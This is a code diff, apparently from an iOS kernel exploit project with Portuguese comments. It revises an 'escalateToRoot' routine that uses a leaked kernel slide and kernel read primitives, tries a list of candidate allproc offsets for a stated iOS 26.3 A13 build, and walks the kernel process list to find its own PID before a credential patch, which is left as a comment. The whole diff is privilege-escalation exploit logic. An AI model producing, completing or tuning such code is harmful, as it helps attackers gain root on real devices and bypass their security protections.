@@ -99,43 +99,51 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
 }
 
 - (BOOL)escalateToRoot {
-    uint64_t slide = [self leakKernelSlide];
-    [self logToWeb:[NSString stringWithFormat:@"🔍 Slide: 0x%llx", slide]];
+    uint64_t slide = [self leakKernelSlide]; // 0x21000000 detectado
     
-    if (slide == 0) {
-        [self logToWeb:@"❌ Erro: Slide não encontrado (KASLR Bypass falhou)"];
-        return NO;
+    // Lista de offsets candidatos para o iOS 26.3 (A13)
+    // O 0x8F50000 falhou, vamos tentar os vizinhos comuns:
+    uint64_t candidatos[] = {0x8F50000, 0x8F70000, 0x8F90000, 0x9010000, 0x8E10000};
+    uint64_t proc = 0;
+    uint64_t allproc_venceu = 0;
+
+    for (int i = 0; i < 5; i++) {
+        uint64_t ptr = (KERN_BASE_STATIC + slide + candidatos[i]);
+        proc = [self kread64:ptr];
+        if (proc != 0 && (proc >> 40) == 0xFFFFFFF0) {
+            allproc_venceu = candidatos[i];
+            [self logToWeb:[NSString stringWithFormat:@"🎯 AllProc Achado: 0x%llx", allproc_venceu]];
+            break;
+        }
     }
 
-    // Tente este novo offset comum no iOS 26.3 (A13) se o 0x8F50000 falhar
-    uint64_t allproc_ptr = (KERN_BASE_STATIC + slide + 0x8F50000ULL);
-    uint64_t proc = [self kread64:allproc_ptr];
-    
-    [self logToWeb:[NSString stringWithFormat:@"🔍 AllProc Ptr: 0x%llx | Primeiro Proc: 0x%llx", allproc_ptr, proc]];
-
     if (proc == 0) {
-        [self logToWeb:@"❌ Erro: OFFSET_ALLPROC inválido para esta build!"];
+        [self logToWeb:@"❌ Nenhum AllProc válido encontrado."];
         return NO;
     }
 
     int timeout = 0;
-    while (proc != 0 && timeout < 500) {
+    while (proc != 0 && timeout < 1000) {
         proc = (proc & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
         
-        // Lendo PID em 0x60 (mais comum no iOS 19/26.x)
-        pid_t found_pid = (pid_t)[self kread32:(proc + 0x60)];
-        
-        if (found_pid == getpid()) {
-            [self logToWeb:[NSString stringWithFormat:@"✅ Sucesso! PID %d achado no offset 0x60", found_pid]];
-            // ... (restante do patch de credenciais)
+        // --- TESTE DE PID ---
+        uint32_t p60 = [self kread32:(proc + 0x60)];
+        uint32_t p68 = [self kread32:(proc + 0x68)];
+
+        // Se achar qualquer um dos dois, o offset está confirmado!
+        if (p60 == getpid()) {
+            [self logToWeb:@"✅ PID ACHADO! Offset Correto: 0x60"];
+            // Aplica patch no ucred...
+            return YES;
+        } else if (p68 == getpid()) {
+            [self logToWeb:@"✅ PID ACHADO! Offset Correto: 0x68"];
+            // Aplica patch no ucred...
             return YES;
         }
-        
+
         proc = [self kread64:(proc + 0x08)];
         timeout++;
     }
-
-    [self logToWeb:@"❌ Erro: Percorreu a lista e não achou seu PID."];
     return NO;
 }
 
